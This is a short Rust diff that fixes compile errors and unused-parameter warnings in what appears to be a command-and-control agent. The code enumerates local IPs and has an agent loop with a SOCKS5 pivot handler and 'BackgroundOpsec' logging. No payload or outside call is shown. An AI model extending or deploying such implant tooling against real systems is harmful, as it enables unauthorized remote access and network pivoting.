@@ -63,7 +63,7 @@ fn get_all_local_ips() -> Vec<String> {
     let mut ips = Vec::new();
     if let Ok(ifaces) = get_if_addrs() {
         for iface in ifaces {
-            match iface.addr {
+            match iface.addr.ip() { // Use .ip() to get the IpAddr
                 std::net::IpAddr::V4(ipv4) => {
                     if !ipv4.is_loopback() && !ipv4.is_multicast() {
                         ips.push(ipv4.to_string());
@@ -333,8 +333,8 @@ fn should_queue_command(cmd: &str) -> bool {
 pub async fn agent_loop(
     server_addr: &str,
     agent_id: &str,
-    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
-    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
+    _pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>, // Prefix with underscore
+    _pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>, // Prefix with underscore
 ) -> Result<(), Box<dyn std::error::Error>> {
     let config = AgentConfig::load()?;
     info!("[SHELL] Entering agent_loop (BackgroundOpsec Active)");
